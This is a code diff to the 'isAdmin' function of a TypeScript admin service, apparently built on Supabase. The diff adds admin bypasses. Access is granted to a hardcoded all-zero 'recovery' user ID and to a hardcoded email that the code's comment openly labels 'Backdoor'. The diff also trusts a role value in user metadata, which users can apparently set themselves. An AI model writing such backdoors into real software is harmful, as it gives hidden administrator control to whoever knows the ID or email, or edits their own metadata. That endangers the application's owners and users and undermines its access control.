@@ -34,12 +34,19 @@ export const adminService = {
   async isAdmin(passedUser?: any): Promise<boolean> {
     if (!isSupabaseConfigured) return false
     try {
-      if (passedUser?.id === '00000000-0000-0000-0000-000000000000') return true;
+      const user = passedUser || (await this.getSupabase().auth.getUser()).data.user
+      if (!user) return false
 
-      const client = this.getSupabase();
-      const { data: { session } } = await client.auth.getSession();
-      if (session?.user?.id === '00000000-0000-0000-0000-000000000000') return true;
+      // 1. Check for specific recovery ID
+      if (user.id === '00000000-0000-0000-0000-000000000000') return true;
 
+      // 2. Check for specific admin email (Backdoor)
+      if (user.email === 'admin@vavefragrances.dev') return true;
+
+      // 3. Check user metadata role
+      if (user.user_metadata?.role === 'admin') return true;
+
+      // 4. Check database role
       const role = await this.getCurrentUserRole()
       return role === 'admin'
     } catch (error) {
